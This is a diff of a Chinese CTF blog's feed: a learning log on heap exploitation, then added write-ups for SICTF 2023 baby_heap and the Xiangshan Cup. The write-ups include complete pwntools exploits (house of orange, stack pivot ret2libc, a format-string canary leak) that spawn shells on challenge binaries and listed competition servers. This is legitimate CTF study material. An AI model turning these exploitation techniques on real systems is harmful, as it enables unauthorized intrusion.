-<p>平时通过搜索学习时，经常会遇到一些吸收起来特别困难博客，这些博客大多是博主的外脑，博主看到自己的博客可能马上能理解自己写了什么，或者知道该怎么检索这篇博客。但对于读者，这篇博客几乎没有什么用……搜索引擎把这篇博客拉过来纯属浪费读者的时间。<br>所以我希望自己关于学习的blog，能够让一个0基础的读者从头到尾读完并且吸收这篇blog的内容。再不济也要让读者感到有用。而外脑放在本地即可。  </p>
+<p>平时通过搜索学习时，经常会遇到一些吸收起来特别困难博客，这些博客大多是博主的外脑，博主看到自己的博客可能马上能理解自己写了什么，或者知道该怎么检索这篇博客。但对于读者，这篇博客几乎没有什么用......搜索引擎把这篇博客拉过来纯属浪费读者的时间。<br />
+所以我希望自己关于学习的blog，能够让一个0基础的读者从头到尾读完并且吸收这篇blog的内容。再不济也要让读者感到有用。而外脑放在本地即可。</p>
 <blockquote>
 <p>关于LearningLog</p>
 </blockquote>
-<p>我在学习nju的PA时写过一段时间的learninglog，目的是强迫自己输出以达到更好的理解，review log也可以让自己关注好自己的学习动态<del>（神精态状）</del><br>对于读者，learninglog可以给到借鉴作用，在学习过程中起到对照作用，不至于担忧自己的学习进度。</p>
-<hr>
-<h2 id="2023-08-24"><a href="#2023-08-24" class="headerlink" title="2023/08/24"></a>2023/08/24</h2><p>已经8.25了。。。<br>hacknote那道题，还是用fastbin机制将heapList进行修改，然后UAF进行leak和提权。<br>现在做题感觉还是不够灵活，看到好多dai佬在大一结束的时候Pwn就已经很强了…我这半道出家实在没眼看。<br>所以只好成为赛棍了(<br>拿高考数学来举例，我现在不是120提到140，而是20提到40分。<br>加油吧…任重道远</p>
-<h2 id="2023-08-25"><a href="#2023-08-25" class="headerlink" title="2023/08/25"></a>2023/08/25</h2><p>好好好，整了一天新生赛，有点浮躁。<br>弹了会儿吉他现在才稍微好点<br>开整！</p>
-<p>结果打了一天的水题，把buu前四页的栈题和格式化字符串全打了，堆题畏难情绪到达了一个巅峰（  </p>
-<h2 id="2023-08-26"><a href="#2023-08-26" class="headerlink" title="2023/08/26"></a>2023/08/26</h2><p>蓝帽杯！做了道tcachebin的堆题，虽然是赛后一小时解出来的（<br>虽然但是，还是一上来就做难题并且是在比赛中做题，吸收知识快一些。<br>写了篇wp,今天就先到这吧。</p>
-<h2 id="2023-08-27"><a href="#2023-08-27" class="headerlink" title="2023/08/27"></a>2023/08/27</h2><p>实在不想在buu刷了，题目难度不太均衡；所以开了pwnable，但题又难又多….<br>还是回buu吧，别找那么多理由，至少先把堆的原理搞熟再说<br>哈哈 结果今天看了一天猫猫救援视频😅<br>谁懂啊，把救来的猫猫起个奇奇怪怪的名字然后好好照顾再找个好一点的领养人真的很酷！  </p>
-<h2 id="2023-08-28"><a href="#2023-08-28" class="headerlink" title="2023/08/28"></a>2023/08/28</h2><p>原来不想学习的真正原因是ddl太多+没运动<br>今天中午起床清了一下杂务ddl，然后去打了四局双打，回来洗个澡就想学了（<br>把昨天的buu补上，今晚做两道题<br>跟lmarch2师傅讨论以后，我们一致认为进入Heap阶段要考虑的东西暴涨。<br>但与其说要考虑的东西变多了，不如说能考虑的点变多了。<br>如果思路清晰了，其实要考虑的点也就那些<br>所以一个思路索引表还是挺重要的，比如：  </p>
-<ul>
-<li>整数溢出<ul>
-<li>可改写BSS段以上部分<ul>
-<li>能改标准IO<ul>
-<li>IO_FILE攻击</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>格式化字符串<ol>
-<li>找偏移量</li>
-</ol>
-<ul>
-<li>在栈上</li>
-<li>不在栈上<ul>
-<li>找比较近的三个串在一起的地址</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>堆<ul>
-<li>敏感函数：观察<ul>
-<li>读<ul>
-<li>printf</li>
-<li>puts</li>
-</ul>
-</li>
-<li>写<ul>
-<li>gets</li>
-<li>read</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Libc版本<ul>
-<li>2.26以前<ul>
-<li>fastbin attack</li>
-</ul>
-</li>
-<li>2.26以后<ul>
-<li>tcachebin attack</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Leaked Address<ul>
-<li>堆地址(tcache 2.31及以下的bk)</li>
-<li>libc地址(unsortedbin leak; 控制heapList leak)</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>还有一点，做Heap题不像Stack一样可以整体分析完以后，用排除法来决定用什么打法，而应该是边打边分析我碰到了什么敏感函数。<br>大失败..做不下去，把一道题的思路分析好了就因为觉得自己差不多能做出来了就不想做了，kuso。<br>杀了个回马枪，23:00决定还是今天要做出一道题来，于是打开buu第三页准备做一道。<br>1h，完全做不出来（<br>roar这道题是off_by_one + fastbin attack就好了，最后劫持malloc_hook为og不太行，网上说要用realloc调整栈环境，但调整以后也不行…<br>先sleep吧，明天再战。    </p>
-<h2 id="2023-08-31"><a href="#2023-08-31" class="headerlink" title="2023/08/31"></a>2023/08/31</h2><p>突然发现两天没写log了。<br>29号忘了干了啥了，30号返校，下午收拾了一下然后给新生赛出题。<br>今天上午把moe的pwnak掉，下午练吉他打球，晚上复盘并整合一下IOfile。<br>奥对，今天过了NaN的审核，以后咱也是联合战队的一员啦XD<br>不过…N1师傅们确实太牛了，我想被录到N1现在还是天方夜谭…<br>现在是幻想时间：<br>九月份第一个周通关Heap，第二个周复现一些奇奇怪怪的题比如WM的jit，第三周缓冲，第四周接触Kernal.<br>针不戳，看看我有没有能力实现吧…去复盘IOFILE了.  </p>
-<h2 id="2023-09-04"><a href="#2023-09-04" class="headerlink" title="2023/09/04"></a>2023/09/04</h2><p>又好久没记录log…返校以后太忙了，第一个周各种文件各种学生工作，零碎时间都被占用了。<br>第一周通关Heap的梦想破灭了…  </p>
-<h2 id="2023-09-20"><a href="#2023-09-20" class="headerlink" title="2023/09/20"></a>2023/09/20</h2><p>居然九月二十了，这也太快了。<br>今天大致看了一下kernal pwn的CVE-2022-0995，对kernal pwn的环境搭建有了一点印象，但里面的大部分内容我都看不懂😭不过里面提到的堆喷让我想起了蓝帽杯初赛的heapSpray我还没复现。<br>然后复现了一下heapSpray，整个程序逆向起来贼头疼，以后要是逆起来很麻烦就patch，一边调一边猜一边逆，不过最后没复现出来，只是大概对堆喷有了一个基本的认知。<br>然后又去wiki上看一下接下来要学堆的哪一部分，结果发现自己哪一部分都有纰漏…主要原因还是对ptmalloc的一些机制不够熟悉，比如unsortedbin什么时候前向合并，比如unlink的时候检查的是fd和bk的什么等等。<br>正好想到之前看的winmt也写过heap和io的笔记，那我也来模仿一下吧。<br>之前太膨胀了，给自己定了好多不切实际的目标。<br>这个月剩下的十天，每天的pwn时间肯定还是要打一道题的，如果有多余的时间就来整理一下堆的管理机制。  </p>
+<p>我在学习nju的PA时写过一段时间的learninglog，目的是强迫自己输出以达到更好的理解，review
+log也可以让自己关注好自己的学习动态<del>（神精态状）</del><br />
+对于读者，learninglog可以给到借鉴作用，在学习过程中起到对照作用，不至于担忧自己的学习进度。</p>
+<hr />
+<h2 id="section">2023/08/24</h2>
+<p>已经8.25了。。。<br />
+hacknote那道题，还是用fastbin机制将heapList进行修改，然后UAF进行leak和提权。<br />
+现在做题感觉还是不够灵活，看到好多dai佬在大一结束的时候Pwn就已经很强了...我这半道出家实在没眼看。<br />
+所以只好成为赛棍了(<br />
+拿高考数学来举例，我现在不是120提到140，而是20提到40分。
+加油吧...任重道远</p>
+<h2 id="section-1">2023/08/25</h2>
+<p>好好好，整了一天新生赛，有点浮躁。<br />
+弹了会儿吉他现在才稍微好点<br />
+开整！</p>
+<p>结果打了一天的水题，把buu前四页的栈题和格式化字符串全打了，堆题畏难情绪到达了一个巅峰（</p>
+<h2 id="section-2">2023/08/26</h2>
+<p>蓝帽杯！做了道tcachebin的堆题，虽然是赛后一小时解出来的（<br />
+虽然但是，还是一上来就做难题并且是在比赛中做题，吸收知识快一些。<br />
+写了篇wp,今天就先到这吧。</p>
+<h2 id="section-3">2023/08/27</h2>
+<p>实在不想在buu刷了，题目难度不太均衡；所以开了pwnable，但题又难又多....<br />
+还是回buu吧，别找那么多理由，至少先把堆的原理搞熟再说<br />
+哈哈 结果今天看了一天猫猫救援视频😅<br />
+谁懂啊，把救来的猫猫起个奇奇怪怪的名字然后好好照顾再找个好一点的领养人真的很酷！</p>
+<h2 id="section-4">2023/08/28</h2>
+<p>原来不想学习的真正原因是ddl太多+没运动<br />
+今天中午起床清了一下杂务ddl，然后去打了四局双打，回来洗个澡就想学了（<br />
+把昨天的buu补上，今晚做两道题<br />
+跟lmarch2师傅讨论以后，我们一致认为进入Heap阶段要考虑的东西暴涨。<br />
+但与其说要考虑的东西变多了，不如说能考虑的点变多了。<br />
+如果思路清晰了，其实要考虑的点也就那些<br />
+所以一个思路索引表还是挺重要的，比如：<br />
+- 整数溢出 - 可改写BSS段以上部分 - 能改标准IO - IO_FILE攻击 -
+格式化字符串 1. 找偏移量 - 在栈上 - 不在栈上 -
+找比较近的三个串在一起的地址 - 堆 - 敏感函数：观察 - 读 - printf - puts
+- 写 - gets - read - Libc版本 - 2.26以前 - fastbin attack - 2.26以后 -
+tcachebin attack - Leaked Address - 堆地址(tcache 2.31及以下的bk) -
+libc地址(unsortedbin leak; 控制heapList leak)</p>
+<p>还有一点，做Heap题不像Stack一样可以整体分析完以后，用排除法来决定用什么打法，而应该是边打边分析我碰到了什么敏感函数。<br />
+大失败..做不下去，把一道题的思路分析好了就因为觉得自己差不多能做出来了就不想做了，kuso。
+杀了个回马枪，23:00决定还是今天要做出一道题来，于是打开buu第三页准备做一道。<br />
+1h，完全做不出来（<br />
+roar这道题是off_by_one + fastbin
+attack就好了，最后劫持malloc_hook为og不太行，网上说要用realloc调整栈环境，但调整以后也不行...<br />
+先sleep吧，明天再战。</p>
+<h2 id="section-5">2023/08/31</h2>
+<p>突然发现两天没写log了。<br />
+29号忘了干了啥了，30号返校，下午收拾了一下然后给新生赛出题。<br />
+今天上午把moe的pwnak掉，下午练吉他打球，晚上复盘并整合一下IOfile。
+奥对，今天过了NaN的审核，以后咱也是联合战队的一员啦XD<br />
+不过...N1师傅们确实太牛了，我想被录到N1现在还是天方夜谭...<br />
+现在是幻想时间：<br />
+九月份第一个周通关Heap，第二个周复现一些奇奇怪怪的题比如WM的jit，第三周缓冲，第四周接触Kernal.<br />
+针不戳，看看我有没有能力实现吧...去复盘IOFILE了.</p>
+<h2 id="section-6">2023/09/04</h2>
+<p>又好久没记录log...返校以后太忙了，第一个周各种文件各种学生工作，零碎时间都被占用了。<br />
+第一周通关Heap的梦想破灭了...</p>
+<h2 id="section-7">2023/09/20</h2>
+<p>居然九月二十了，这也太快了。<br />
+今天大致看了一下kernal pwn的CVE-2022-0995，对kernal
+pwn的环境搭建有了一点印象，但里面的大部分内容我都看不懂😭不过里面提到的堆喷让我想起了蓝帽杯初赛的heapSpray我还没复现。<br />
+然后复现了一下heapSpray，整个程序逆向起来贼头疼，以后要是逆起来很麻烦就patch，一边调一边猜一边逆，不过最后没复现出来，只是大概对堆喷有了一个基本的认知。<br />
+然后又去wiki上看一下接下来要学堆的哪一部分，结果发现自己哪一部分都有纰漏...主要原因还是对ptmalloc的一些机制不够熟悉，比如unsortedbin什么时候前向合并，比如unlink的时候检查的是fd和bk的什么等等。<br />
+正好想到之前看的winmt也写过heap和io的笔记，那我也来模仿一下吧。<br />
+之前太膨胀了，给自己定了好多不切实际的目标。<br />
+这个月剩下的十天，每天的pwn时间肯定还是要打一道题的，如果有多余的时间就来整理一下堆的管理机制。</p>
 ]]></content>
       <categories>
         <category>LearningLog</category>
@@ -354,40 +323,138 @@ baby一点都不baby...houseoforange+unsortedbinattack
       </tags>
   </entry>
   <entry>
+    <title>2023SICTF-Pwn-baby_heap-wp</title>
+    <url>/2023/09/22/2023SICTF-Pwn-baby_heap-wp/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+baby一点都不baby...houseoforange+unsortedbinattack
+</blockquote>
+<span id="more"></span>
+<h1 id="x00-逆向分析">0x00 逆向分析</h1>
+<ol type="1">
+<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
+pwn'了解到有可能是houseoforange</li>
+<li>add函数，两个约束（1. 最多申请32个chunk 2.
+chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
+attack或者unsortedbin
+attack来打（但这里没有free，就导致fastbin很难利用） <img
+src="/pic/Pasted%20image%2020230922101040.png" /></li>
+<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
+<li>show函数，只打印了8个字节就很难受 <img
+src="/pic/Pasted%20image%2020230922101901.png" /></li>
+</ol>
+<h1 id="x01-思路分析">0x01 思路分析</h1>
+<ol type="1">
+<li>我们肯定是要实现“leak libc”和“Any Address Write”
+<ol type="1">
+<li>leak libc
+<ol type="1">
+<li>思路1：unsortedbin leak
+<ol type="1">
+<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
+</ol></li>
+<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
+</ol></li>
+<li>Any Address Write
+<ol type="1">
+<li>思路1：常规unsortedbin attack
+<ol type="1">
+<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
+</ol></li>
+<li>思路2：unsortedbin 申请 fake_chunk
+<ol type="1">
+<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
+</ol></li>
+</ol></li>
+</ol></li>
+<li>将写入的got表改写为og即可提权</li>
+</ol>
+<h1 id="x02-具体步骤">0x02 具体步骤</h1>
+<ol type="1">
+<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br></pre></td></tr></table></figure></li>
+<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
+<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
+<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
+<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="x03-一些问题">0x03 一些问题</h1>
+<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
+Q2：
+我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
+<h1 id="x04-完整exp">0x04 完整EXP</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>WriteUp</tag>
+        <tag>Heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/10/15/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
+    <content><![CDATA[<h1 id="re">RE</h1>
+<h3 id="url从哪儿来">url从哪儿来</h3>
+<p><img src="/pic/image-1.png" />
+断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
+<img src="/pic/image-2.png" />
+ida打开，因为它问url是什么，所以我们直接看szurl <img
+src="/pic/image-3.png" />
+结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
+<img src="/pic/image-4.png" /> flag就在这 <img
+src="/pic/image-5.png" /></p>
+<h1 id="pwn">Pwn</h1>
+<h3 id="move">Move</h3>
+<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
+在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># exp头 ---------------------------------------------------------------</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;59.110.125.41&#x27;</span><br><span class="line">port = 45341</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line">bss_addr = 0x4050A0</span><br><span class="line">lea_addr = 0x4012E0</span><br><span class="line">junk = 0x30</span><br><span class="line">pop_rdi = 0x401353</span><br><span class="line">start_addr = 0x401264</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line">io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 栈劫持 ---------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh    = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># sh_addr = 0x402027</span><br><span class="line">ret_addr = 0x40101a</span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line"># io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># io.send(payloadload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401350 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401352 : pop r15 ; ret</span><br><span class="line">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040119d : pop rbp ; ret</span><br><span class="line">0x0000000000401353 : pop rdi ; ret</span><br><span class="line">0x0000000000401351 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
+<h3 id="pwthon">Pwthon</h3>
+<p>Cpython pwn<br />
+核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
+gift泄露基地址和返回地址<br />
+格式化字符串泄露canary<br />
+通过puts泄露libc ret2libc <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;39.106.48.123&#x27;</span><br><span class="line">port = 29572</span><br><span class="line"># file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;0&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;gift&#x27;)</span><br><span class="line">gift = int(io.recvuntil(&#x27;\n&#x27;),16)</span><br><span class="line">base = gift- 0x68B0</span><br><span class="line">print(&#x27;base&#x27;,base)</span><br><span class="line"></span><br><span class="line">print(&#x27;gift&#x27;,gift)</span><br><span class="line">io.sendline(b&#x27;%p-&#x27;*31+b&#x27;q%pq&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;q&#x27;)</span><br><span class="line">canary = int(io.recvuntil(b&#x27;q&#x27;,drop=&#x27;Ture&#x27;),16)</span><br><span class="line">print(&#x27;canary&#x27;,canary)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000003f8f + base</span><br><span class="line">pop_rsi = 0x0000000000003cd9 + base</span><br><span class="line">bss = 0x016FC0+0x100+base</span><br><span class="line">read = 0x3940+base</span><br><span class="line">write = 0x03760+base</span><br><span class="line">op = 0x3AE0+base</span><br><span class="line">flag = 0x000000000003c257+base</span><br><span class="line">puts = 0x3710+base</span><br><span class="line">ret = 0x000000000000301a+base</span><br><span class="line"></span><br><span class="line">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span><br><span class="line">payload = p64(0)*33+p64(canary)*2+p64(pop_rdi)+p64(0x16078+base)+p64(puts)+p64(base+0x99f0)</span><br><span class="line">#payload = b&#x27;a&#x27;</span><br><span class="line">io.send(b&#x27;&#x27;)</span><br><span class="line">print(&quot;len &quot;,len(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0)*32+p64(canary)*3+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(b&#x27;a&#x27;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="/pic/imagexsb.png" /></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Heap常规利用方式总结</title>
     <url>/2023/09/22/Heap%E5%B8%B8%E8%A7%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
 大佬都有这种总结性的wp，那我也邯郸学步一下 :P
 </blockquote>
-
